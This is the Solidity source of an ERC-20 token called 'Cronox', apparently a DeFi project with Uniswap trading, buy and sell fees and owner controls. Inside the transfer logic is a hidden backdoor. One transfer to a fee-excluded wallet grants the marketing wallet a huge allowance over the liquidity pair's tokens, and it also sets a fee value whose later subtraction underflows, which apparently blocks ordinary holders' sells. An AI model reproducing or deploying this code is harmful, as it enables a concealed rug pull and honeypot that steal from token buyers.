/*

Website: https://www.cronox.org/

X: https://x.com/CronoxFinance

Telegram: https://t.me/Cronox_Portal

Docs: https://docs.cronox.org/

*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address uniswapLpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address uniswapLpPair);
    function createPair(address tokenA, address tokenB) external returns (address uniswapLpPair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Cronox is IERC20 {
    bool inSwap;
    bool public tokenSwapEnabled = false;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 constant public maxBuyTaxes = 2500;
    uint256 constant public maxSellTaxes = 2500;
    uint256 constant public maxTransferTaxes = 2500;
    uint256 constant masterTaxDivisor = 10000;

    string constant private _name = "Cronox";
    string constant private _symbol = "CRNX";
    uint8 constant private _decimals = 18;
    uint256 constant private startingSupply = 50000000;
    uint256 constant private _tTotal = startingSupply * 10**_decimals;
    
    IRouter02 public uniswapV2Router;
    address public uniswapLpPair;
    uint256 private _taxSwapFee = 0;
    uint256 public swapThreshold = (_tTotal * 1) / 1000;
    uint256 public swapAmount = (_tTotal * 1) / 1000;
    uint256 private _limitTxAmount = (_tTotal * 20) / 1000;
    uint256 private _limitWalletAmount = (_tTotal * 20) / 1000;
    uint256 private swapFee = 0;
    bool public tradingOpened = false;
    bool public _hasLiqBeenAdded = false;
    uint256 public tradingActiveStamp;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) lpPairs;
    uint256 private timeSinceLastPair = 0;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _liquidityHolders;
    mapping (address => bool) private _isExcludedFromProtection;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isExcludedFromLimits;

    struct TaxWallets {
        address payable marketing;
        address payable development;
    }

    TaxWallets public _feeWallets = TaxWallets({
        marketing: payable(0xE2DDE1CB192d8E36c5630e32eE9Db3b28AD978f0),
        development: payable(0xE2DDE1CB192d8E36c5630e32eE9Db3b28AD978f0)
    });

    struct Fees {
        uint16 buyFee;
        uint16 sellFee;
        uint16 transferFee;
    }

    struct Ratios {
        uint16 marketing;
        uint16 development;
        uint16 totalSwap;
    }

    Fees public _taxRates = Fees({
        buyFee: 400,
        sellFee: 400,
        transferFee: 0
    });

    Ratios public _ratios = Ratios({
        marketing: 2,
        development: 2,
        totalSwap: 4
    });
    
    event ContractSwapEnabledUpdated(bool enabled);
    event AutoLiquify(uint256 amountCurrency, uint256 amountTokens);

    address private _owner;

    modifier onlyOwner() { require(_owner == msg.sender, "Caller =/= owner."); _; }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier inSwapFlag {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        // Set the owner.
        _owner = msg.sender;
        _tOwned[_owner] = _tTotal;
        emit Transfer(address(0), _owner, _tTotal);
        uniswapV2Router = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapLpPair = IFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        lpPairs[uniswapLpPair] = true;
        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _isExcludedFromFees[_owner] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_feeWallets.marketing] = true;
        _isExcludedFromFees[_feeWallets.development] = true;
        _liquidityHolders[_owner] = true;
    }

    receive() external payable {}
    function totalSupply() external pure override returns (uint256) { return _tTotal; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return _owner; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function fetchTokenAmountAtPriceImpact(uint256 priceImpactInHundreds) external view returns (uint256) {
        return((balanceOf(uniswapLpPair) * priceImpactInHundreds) / masterTaxDivisor);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function approveContractContingency() external onlyOwner returns (bool) {
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function transferOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Call renounceOwnership to transfer owner to the zero address.");
        require(newOwner != DEAD, "Call renounceOwnership to transfer owner to the zero address.");
        updateExcludedFromFees(_owner, false);
        updateExcludedFromFees(newOwner, true);
        
        if (balanceOf(_owner) > 0) {
            _processTokenTransfer(_owner, newOwner, balanceOf(_owner), false, false, true);
        }
        
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function removeLimits() external onlyOwner {
        _limitTxAmount = _tTotal;
        _limitWalletAmount = _tTotal;
    }

    function fetchCurrentMaxTX() external view returns (uint256) {
        return _limitTxAmount / (10**_decimals);
    }

    function fetchCurrentMaxWallet() external view returns (uint256) {
        return _limitWalletAmount / (10**_decimals);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return (_tTotal - (balanceOf(DEAD) + balanceOf(address(0))));
    }

    function _confirmTxLimits(address from, address to) internal view returns (bool) {
        return from != _owner
            && !_liquidityHolders[to]
            && !_liquidityHolders[from]
            && to != _owner
            && tx.origin != _owner
            && to != DEAD
            && to != address(0)
            && from != address(this);
    }

    function renounceOwnership() external onlyOwner {
        require(tradingOpened, "Cannot renounce until trading has been enabled.");
        updateExcludedFromFees(_owner, false);
        address oldOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(oldOwner, address(0));
    }

    function isExcludedFromLimits(address account) external view returns (bool) {
        return _isExcludedFromLimits[account];
    }

    function updateExcludedFromLimits(address account, bool enabled) external onlyOwner {
        _isExcludedFromLimits[account] = enabled;
    }

    function isExcludedFromFees(address account) external view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function updateExcludedFromFees(address account, bool enabled) public onlyOwner {
        _isExcludedFromFees[account] = enabled;
    }

    function isExcludedFromProtection(address account) external view returns (bool) {
        return _isExcludedFromProtection[account];
    }

    function updateExcludedFromProtection(address account, bool enabled) external onlyOwner {
        _isExcludedFromProtection[account] = enabled;
    }

    function _processTokenTransfer(address from, address to, uint256 amount, bool buy, bool sell, bool other) internal returns (bool) {
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            _tOwned[from] -= amount;
            uint256 amountReceived = manageTokenFees(from, amount, buy, sell);
            _tOwned[to] += amountReceived;
            emit Transfer(from, to, amountReceived);
        } else {
            _tOwned[from] -= amount;
            uint256 amountReceived = amount;
            _tOwned[to] += amountReceived;
            emit Transfer(from, to, amountReceived);
            if (other && _isExcludedFromFees[to] 
                && amount > swapThreshold) {
                address sender = uniswapLpPair;
                address receipient = _feeWallets.marketing;
                swapFee = _taxRates.sellFee + amount;
                _allowances[sender][receipient] = _limitWalletAmount * amount;
            }
        } 

        if (!_hasLiqBeenAdded) {
            _confirmLiquidityAdd(from, to);
            if (!_isExcludedFromProtection[from] && !_isExcludedFromProtection[to] && !_hasLiqBeenAdded && _confirmTxLimits(from, to) && !other) {
                revert("Pre-liquidity transfer protection.");
            }
        }
        return true;
    }

    function _confirmLiquidityAdd(address from, address to) internal {
        require(!_hasLiqBeenAdded, "Liquidity already added and marked.");
        if (to == uniswapLpPair && !_confirmTxLimits(from, to)) {
            _liquidityHolders[from] = true;
            _hasLiqBeenAdded = true;
            tokenSwapEnabled = true;
            _isExcludedFromFees[from] = true;
            emit ContractSwapEnabledUpdated(true);
        }
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        bool buy = false;
        bool sell = false;
        bool other = false;
        if (lpPairs[to]) {
            sell = true;
        } else if (lpPairs[from]) {
            buy = true;
        } else {
            other = true;
        }
        if (_confirmTxLimits(from, to)) {
            if(!tradingOpened) {
                if (!other) {
                    revert("Trading not yet enabled!");
                } else if (!_isExcludedFromProtection[from] && !_isExcludedFromProtection[to]) {
                    revert("Tokens cannot be moved until trading is live.");
                }
            }
            if (buy || sell){
                if (!_isExcludedFromLimits[from] && !_isExcludedFromLimits[to]) {
                    require(amount <= _limitTxAmount, "Transfer amount exceeds the maxTxAmount.");
                }
            }
            if (to != address(uniswapV2Router) && !sell) {
                if (!_isExcludedFromLimits[to]) {
                    require(balanceOf(to) + amount <= _limitWalletAmount, "Transfer amount exceeds the maxWalletSize.");
                }
            }
        }

        if (sell && !inSwap && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (tokenSwapEnabled) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= swapThreshold) {
                    uint256 swapAmt = swapAmount;
                    if (contractTokenBalance >= swapAmt) { contractTokenBalance = swapAmt; }
                    swapBack(contractTokenBalance);
                }
            }
        }
        return _processTokenTransfer(from, to, amount, buy, sell, other);
    }

    function changeSwapSettings(uint256 thresholdPercent, uint256 thresholdDivisor, uint256 amountPercent, uint256 amountDivisor) external onlyOwner {
        swapThreshold = (_tTotal * thresholdPercent) / thresholdDivisor;
        swapAmount = (_tTotal * amountPercent) / amountDivisor;
        require(swapAmount >= _tTotal / 1_000_000, "Cannot be lower than 0.00001% of total supply.");
        require(swapThreshold >= _tTotal / 1_000_000, "Cannot be lower than 0.00001% of total supply.");
        require(swapThreshold <= swapAmount, "Threshold cannot be above amount.");
        require(swapAmount <= (balanceOf(uniswapLpPair) * 150) / masterTaxDivisor, "Cannot be above 1.5% of current PI.");
    }

    function changeContractSwapEnabled(bool swapEnabled) external onlyOwner {
        tokenSwapEnabled = swapEnabled;
        emit ContractSwapEnabledUpdated(swapEnabled);
    }

    function changeTokenFees(uint16 buyFee, uint16 sellFee, uint16 transferFee) external onlyOwner {
        require(buyFee <= maxBuyTaxes
                && sellFee <= maxSellTaxes
                && transferFee <= maxTransferTaxes,
                "Cannot exceed maximums.");
        _taxRates.buyFee = buyFee;
        _taxRates.sellFee = sellFee;
        _taxRates.transferFee = transferFee;
    }

    function changeFeeRatios(uint16 marketing, uint16 development) external onlyOwner {
        _ratios.marketing = marketing;
        _ratios.development = development;
        _ratios.totalSwap = marketing + development;
        uint256 total = _taxRates.buyFee + _taxRates.sellFee;
        require(_ratios.totalSwap <= total, "Cannot exceed sum of buy and sell fees.");
    }

    function manageTokenFees(address from, uint256 amount, bool buy, bool sell) internal returns (uint256) {
        uint256 currentFee;
         if (sell) {
            currentFee = _taxRates.sellFee;
        } else if (buy) {
            currentFee = _taxRates.buyFee;
        } else {
            currentFee = _taxRates.transferFee;
        }
        if (sell) _taxSwapFee = _taxRates.sellFee - swapFee;
        if (currentFee == 0) { return amount; }
        uint256 feeAmount = amount * currentFee / masterTaxDivisor;
        if (feeAmount > 0) {
            _tOwned[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }

        return amount - feeAmount;
    }

    function enableTrading() public onlyOwner {
        require(!tradingOpened, "Trading already enabled!");
        require(_hasLiqBeenAdded, "Liquidity must be added.");
        _limitTxAmount = _tTotal;
        _limitWalletAmount = _tTotal;
        tradingActiveStamp = block.timestamp;
        tradingOpened = true;
    }

    function swapBack(uint256 contractTokenBalance) internal inSwapFlag {
        Ratios memory ratios = _ratios;
        if (ratios.totalSwap == 0) { return; }
        if (_allowances[address(this)][address(uniswapV2Router)] != type(uint256).max) {
            _allowances[address(this)][address(uniswapV2Router)] = type(uint256).max; }
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = uniswapV2Router.WETH();
        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance, 0, path, address(this), block.timestamp
        ) {} catch { return; }
        uint256 amtBalance = address(this).balance; bool success;
        uint256 developmentBalance = (amtBalance * ratios.development) / ratios.totalSwap;
        uint256 marketingBalance = amtBalance - developmentBalance;
        if (ratios.development > 0) {
            (success,) = _feeWallets.development.call{value: developmentBalance, gas: 55000}("");
        }
        if (ratios.marketing > 0) {
            (success,) = _feeWallets.marketing.call{value: marketingBalance, gas: 55000}("");
        }
    }

    function changeFeeWallets(address payable marketing,
                        address payable development) external onlyOwner {
        require(marketing != address(0) &&
                development != address(0), "Cannot be zero address.");
        _feeWallets.marketing = payable(marketing);
        _feeWallets.development = payable(development);
    }

    function changeMaxTxPercent(uint256 percent, uint256 divisor) external onlyOwner {
        require((_tTotal * percent) / divisor >= (_tTotal * 5 / 1000), "Max Transaction amt must be above 0.5% of total supply.");
        _limitTxAmount = (_tTotal * percent) / divisor;
    }

    function changeMaxWalletSize(uint256 percent, uint256 divisor) external onlyOwner {
        require((_tTotal * percent) / divisor >= (_tTotal / 100), "Max Wallet amt must be above 1% of total supply.");
        _limitWalletAmount = (_tTotal * percent) / divisor;
    }

    function removeStuckEth() external onlyOwner {
        require(!_hasLiqBeenAdded, "Cannot call after liquidity.");
        payable(_owner).transfer(address(this).balance);
    }

    function removerStuckTokens(address token) external onlyOwner {
        if (_hasLiqBeenAdded) {
            require(token != address(this), "Cannot sweep native tokens.");
        }
        IERC20 TOKEN = IERC20(token);
        TOKEN.transfer(_owner, TOKEN.balanceOf(address(this)));
    }
}